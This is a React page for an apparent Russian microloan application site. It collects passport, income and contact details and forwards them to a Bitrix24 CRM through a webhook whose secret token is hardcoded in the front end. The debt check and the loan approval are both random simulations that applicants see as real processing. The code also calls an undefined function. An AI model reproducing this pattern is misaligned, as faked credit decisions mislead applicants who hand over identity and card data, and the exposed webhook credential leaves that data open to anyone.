import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import Icon from "@/components/ui/icon";
import { useState, useEffect } from "react";
import { useToast } from "@/hooks/use-toast";
import ChatAssistant from "@/components/ChatAssistant";
import StepProgressBar from "@/components/loan/StepProgressBar";
import FormSteps, { FormData } from "@/components/loan/FormSteps";
import LoanParametersStep from "@/components/loan/LoanParametersStep";
import ProgressBar from "@/components/loan/ProgressBar";
import ProcessingScreen from "@/components/loan/ProcessingScreen";
import ResultScreen from "@/components/loan/ResultScreen";
import CardBindingStep from "@/components/loan/CardBindingStep";


type SubmitStatus = 'idle' | 'processing' | 'approved' | 'rejected';

const Index = () => {
  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    lastName: '',
    middleName: '',
    birthDate: '',
    passportSeries: '',
    passportNumber: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    income: '',
    workplace: '',
    workAddress: '',
    workPhone: '',
    loanAmount: 50000,
    loanTerm: 30
  });

  const [currentStep, setCurrentStep] = useState(1);
  
  const handleLoanParametersChange = (field: 'loanAmount' | 'loanTerm', value: number) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<SubmitStatus>('idle');
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingTimer, setProcessingTimer] = useState(60);
  const [showCardBinding, setShowCardBinding] = useState(false);

  const { toast } = useToast();

  const handleInputChange = (field: keyof FormData, value: string | number | File) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const calculateLoan = () => {
    const principal = formData.loanAmount;
    const days = formData.loanTerm;
    const dailyRate = 0.01;
    
    const totalInterest = principal * dailyRate * days;
    const totalAmount = principal + totalInterest;
    const dailyPayment = totalAmount / days;

    return {
      totalAmount: Math.round(totalAmount),
      overpayment: Math.round(totalInterest),
      dailyPayment: dailyPayment
    };
  };

  const nextStep = () => {
    if (currentStep < 6) {
      setCurrentStep(prev => prev + 1);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
    }
  };

  const handleCardBindingSuccess = () => {
    setShowCardBinding(false);
    toast({
      title: "Карта привязана",
      description: "Карта успешно привязана к аккаунту",
    });
  };

  // Проверка долга ФССП
  const checkFsspDebt = async (fullName: string, birthDate: string): Promise<number> => {
    // Имитация запроса к ФССП API
    // В реальном проекте здесь будет запрос к API ФССП
    return new Promise((resolve) => {
      setTimeout(() => {
        // Имитируем случайную сумму долга для демонстрации
        const randomDebt = Math.floor(Math.random() * 50000);
        resolve(randomDebt);
      }, 2000);
    });
  };







  useEffect(() => {
    if (isProcessing && processingTimer > 0) {
      const timer = setTimeout(() => {
        setProcessingTimer(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (processingTimer === 0 && isProcessing) {
      setIsProcessing(false);
      const isApproved = Math.random() > 0.3;
      setSubmitStatus(isApproved ? 'approved' : 'rejected');
    }
  }, [processingTimer, isProcessing]);

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus('processing');
    setIsProcessing(true);
    setProcessingTimer(60);

    // Проверка долга ФССП перед отправкой
    try {
      const fullName = `${formData.lastName} ${formData.firstName} ${formData.middleName}`.trim();
      const debt = await checkFsspDebt(fullName, formData.birthDate);
      
      if (debt > 30000) {
        setIsProcessing(false);
        setSubmitStatus('rejected');
        setIsSubmitting(false);
        return;
      }

      // Отправка данных в Bitrix24 только если долг менее 30000
      await sendToBitrix24(formData);
    } catch (error) {
      console.error('Ошибка отправки:', error);
    }

    setIsSubmitting(false);
  };

  const sendToBitrix24 = async (data: FormData) => {
    const webhookUrl = 'https://b24-0vo5vw.bitrix24.ru/rest/1/q5be4cfha7ph0li8/';
    
    const response = await fetch(`${webhookUrl}crm.lead.add.json`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        fields: {
          TITLE: `Заявка МФО: ${data.firstName} ${data.lastName}`,
          NAME: data.firstName,
          LAST_NAME: data.lastName,
          EMAIL: [{ VALUE: data.email, VALUE_TYPE: 'WORK' }],
          PHONE: [{ VALUE: data.phone, VALUE_TYPE: 'WORK' }],
          ADDRESS: data.address,
          COMMENTS: `
            ФИО: ${data.lastName} ${data.firstName} ${data.middleName}
            Дата рождения: ${data.birthDate}
            Паспорт: ${data.passportSeries} ${data.passportNumber}
            Город: ${data.city}
            Место работы: ${data.workplace}
            Адрес работы: ${data.workAddress}
            Рабочий телефон: ${data.workPhone}
            Доход: ${data.income}
            Сумма займа: ${data.loanAmount}
          `,
          SOURCE_ID: 'WEB',
          SOURCE_DESCRIPTION: 'Заявка МФО с сайта'
        }
      })
    });

    if (!response.ok) {
      throw new Error('Ошибка отправки данных');
    }
  };

  const resetForm = () => {
    setFormData({
      firstName: '',
      lastName: '',
      middleName: '',
      birthDate: '',
      passportSeries: '',
      passportNumber: '',
      email: '',
      phone: '',
      address: '',
      city: '',
      income: '',
      workplace: '',
      workAddress: '',
      workPhone: '',
      loanAmount: 50000,
      loanTerm: 30
    });
    setCurrentStep(1);
    setSubmitStatus('idle');
    setIsSubmitting(false);
    setIsProcessing(false);
    setProcessingTimer(60);
    setShowCardBinding(false);
    setShowTelegramVerification(false);
  };

  const getStepTitle = () => {
    switch (currentStep) {
      case 1: return "Параметры займа";
      case 2: return "Личные данные";
      case 3: return "Документы";
      case 4: return "Контактная информация";
      case 5: return "Финансовая информация";
      case 6: return "Привязка карты";
      default: return "Заявка на займ";
    }
  };

  const getStepDescription = () => {
    switch (currentStep) {
      case 1: return "Выберите сумму и срок займа";
      case 2: return "Заполните основную информацию";
      case 3: return "Загрузите документы";
      case 4: return "Укажите контакты";
      case 5: return "Выберите параметры займа";
      case 6: return "Привяжите карту для получения займа";
      default: return "";
    }
  };

  // Экран обработки заявки
  if (submitStatus === 'processing') {
    return <ProcessingScreen processingTimer={processingTimer} />;
  }

  // Экран результата
  if (submitStatus === 'approved' || submitStatus === 'rejected') {
    return <ResultScreen submitStatus={submitStatus} resetForm={resetForm} />;
  }

  return (
    <div 
      className="min-h-screen py-4 md:py-4 relative overflow-hidden"
      style={{
        backgroundImage: `url('/img/8f60907b-2d93-41c9-848d-34fe66f9edee.jpg')`,
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      {/* Затемняющий оверлей */}
      <div className="absolute inset-0 bg-black/30 backdrop-blur-sm" />
      
      <div className="max-w-2xl mx-auto px-2 md:px-4 relative z-10">
        <form onSubmit={handleSubmit}>
          {/* Логотип вверху */}
          <div className="text-center mb-4 md:mb-6">
            <div className="inline-flex items-center gap-2 md:gap-3 bg-white/90 backdrop-blur-sm rounded-xl md:rounded-2xl px-4 md:px-8 py-3 md:py-4 shadow-2xl border border-white/30">
              <div className="w-10 h-10 md:w-12 md:h-12 bg-blue-600 rounded-lg md:rounded-xl flex items-center justify-center">
                <Icon name="Banknote" size={20} className="text-white md:w-6 md:h-6" />
              </div>
              <div className="text-left">
                <h1 className="text-xl md:text-2xl font-bold text-gray-800">Деньги в Дом</h1>
                <p className="text-xs md:text-sm text-gray-500">Быстрые займы онлайн</p>
              </div>
            </div>
          </div>

          {/* Прогресс-бар в процентах */}
          <ProgressBar currentStep={currentStep} totalSteps={6} />

          <Card className="bg-white/95 backdrop-blur-sm rounded-xl md:rounded-2xl shadow-2xl border border-white/20 min-h-[70vh] md:min-h-0">
            
            <CardHeader className="text-center pb-4 md:pb-6 px-4 md:px-6 pt-4 md:pt-6">
              <CardTitle className="text-xl md:text-2xl font-bold text-gray-800 mb-2 flex items-center justify-center gap-2 md:gap-3">
                <Icon name="CreditCard" size={24} className="text-blue-600 md:w-7 md:h-7" />
                {getStepTitle()}
              </CardTitle>
              <p className="text-gray-600 text-xs md:text-sm">
                {getStepDescription()}
              </p>
            </CardHeader>

            <CardContent className="p-4 md:p-8 space-y-4 md:space-y-6">
              {currentStep === 6 ? (
                <CardBindingStep 
                  onSuccess={handleCardBindingSuccess} 
                  onSubmit={handleSubmit}
                  isSubmitting={isSubmitting}
                  phoneNumber={formData.phone}
                />
              ) : (
                currentStep === 1 ? (
                  <LoanParametersStep 
                    loanAmount={formData.loanAmount}
                    loanTerm={formData.loanTerm}
                    onAmountChange={(amount) => handleLoanParametersChange('loanAmount', amount)}
                    onTermChange={(term) => handleLoanParametersChange('loanTerm', term)}
                    onNext={nextStep}
                  />
                ) : (
                  <FormSteps 
                    currentStep={currentStep - 1}
                    formData={formData}
                    handleInputChange={handleInputChange}
                    calculateLoan={calculateLoan}
                  />
                )
              )}

              {/* Навигация */}
              <div className="flex justify-between pt-8">
                {currentStep > 1 && (
                  <Button
                    type="button"
                    onClick={prevStep}
                    variant="outline"
                    className="px-6 py-2 border-gray-300 text-gray-700 hover:bg-gray-50"
                  >
                    <Icon name="ChevronLeft" size={16} className="mr-2" />
                    Назад
                  </Button>
                )}
                
                <div className="ml-auto">
                  {currentStep === 1 ? null : currentStep < 5 ? (
                    <Button
                      type="button"
                      onClick={nextStep}
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2"
                    >
                      Далее
                      <Icon name="ChevronRight" size={16} className="ml-2" />
                    </Button>
                  ) : currentStep === 5 ? (
                    <Button
                      type="button"
                      onClick={nextStep}
                      className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2"
                    >
                      К привязке карты
                      <Icon name="ChevronRight" size={16} className="ml-2" />
                    </Button>
                  ) : currentStep === 6 ? null : (
                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      className="bg-green-600 hover:bg-green-700 disabled:opacity-50 text-white px-6 py-2"
                    >
                      {isSubmitting ? (
                        <div className="flex items-center gap-2">
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                          Отправляем...
                        </div>
                      ) : (
                        <div className="flex items-center">
                          <Icon name="Send" size={16} className="mr-2" />
                          Подать заявку
                        </div>
                      )}
                    </Button>
                  )}
                </div>
              </div>
            </CardContent>
          </Card>
        </form>
      </div>
      
      {/* Чат-помощник */}
      <ChatAssistant />
    </div>
  );
};

export default Index;